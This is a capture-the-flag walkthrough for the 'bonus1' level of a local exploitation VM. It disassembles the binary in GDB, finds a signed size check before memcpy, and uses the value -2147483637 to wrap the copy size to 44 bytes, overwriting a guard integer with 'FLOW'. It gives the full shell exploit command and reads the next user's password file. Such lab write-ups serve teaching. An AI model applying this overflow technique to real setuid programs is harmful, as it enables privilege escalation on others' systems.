# Bonus 1

## Connect to the virtual machine with SSH

Use the flag from `bonus0` as the `bonus1` password:

```
ssh bonus1@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```
scp -P 2223 bonus1@127.0.0.1:/home/user/bonus1/bonus1 ./bonus1/
```

The extracted binary is saved as `bonus1/bonus1`.

## Copy the GDB dump to the host

Inside the VM, connected as `bonus1`, open the binary with GDB:

```
gdb ./bonus1
```

Then enter:

```
set disassembly-flavor intel
set pagination off
set logging file /tmp/bonus1_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Then copy the dump back from the host:

```
scp -P 2223 bonus1@127.0.0.1:/tmp/bonus1_main_dump_gdb ./bonus1/
```

Since the binary is already on the host, the same dump can also be generated locally:

```
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  ./bonus1/bonus1 > ./bonus1/bonus1_main_dump_gdb
```

## Analyze the GDB dump

The program converts `argv[1]` with `atoi` and stores the result:

```asm
0x08048435 <+17>: mov    DWORD PTR [esp],eax
0x08048438 <+20>: call   0x8048360 <atoi@plt>
0x0804843d <+25>: mov    DWORD PTR [esp+0x3c],eax
```

Then it rejects values greater than `9`:

```asm
0x08048441 <+29>: cmp    DWORD PTR [esp+0x3c],0x9
0x08048446 <+34>: jle    0x804844f <main+43>
```

If the value is accepted, it multiplies it by 4 and uses that as the size for
`memcpy`:

```asm
0x0804844f <+43>: mov    eax,DWORD PTR [esp+0x3c]
0x08048453 <+47>: lea    ecx,[eax*4+0x0]
...
0x08048464 <+64>: lea    eax,[esp+0x14]
0x08048468 <+68>: mov    DWORD PTR [esp+0x8],ecx
0x0804846c <+72>: mov    DWORD PTR [esp+0x4],edx
0x08048470 <+76>: mov    DWORD PTR [esp],eax
0x08048473 <+79>: call   0x8048320 <memcpy@plt>
```

After the copy, it checks whether the saved integer is equal to `0x574f4c46`:

```asm
0x08048478 <+84>: cmp    DWORD PTR [esp+0x3c],0x574f4c46
0x08048480 <+92>: jne    0x804849e <main+122>
```

`0x574f4c46` is the little-endian integer made by the ASCII bytes:

```text
46 4c 4f 57 = FLOW
```

If the comparison succeeds, the binary runs `/bin/sh`:

```asm
0x08048499 <+117>: call   0x8048350 <execl@plt>
```

## Find the exact offset

The destination buffer starts at `esp + 0x14`. The checked integer is stored at
`esp + 0x3c`.

Ask GDB for the exact distance:

```gdb
break *main+79
run -2147483637 AAAA
p/x $esp+0x14
p/x $esp+0x3c
p/d ($esp+0x3c)-($esp+0x14)
```

Result:

```text
Breakpoint 1, 0x08048473 in main ()
$1 = 0xbffffbe4
$2 = 0xbffffc0c
$3 = 40
```

So after 40 bytes, the copy reaches the checked integer.

## Build the integer overflow

The first argument must pass this check:

```text
argv[1] <= 9
```

But the copy size is:

```text
argv[1] * 4
```

Use a negative integer that passes `<= 9`, but overflows when multiplied by 4.

The chosen value is:

```text
-2147483637
```

In 32-bit arithmetic:

```text
-2147483637 * 4 = 44
```

GDB confirms the wrapped value:

```gdb
p/x -2147483637*4
```

Result:

```text
$4 = 0x2c
```

`0x2c` is decimal `44`, so `memcpy` copies 44 bytes.

The payload for `argv[2]` is:

```text
40 bytes of padding + FLOW
```

This overwrites the checked integer with `0x574f4c46`.

## Exploitation

Run this in the VM:

```bash
(/home/user/bonus1/bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"'); cat)
```

The `cat` keeps stdin open for the shell.

Check the effective identity:

```bash
whoami
```

Result:

```text
bonus2
```

Read the next password:

```bash
cat /home/user/bonus2/.pass
```

## Flag

```text
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
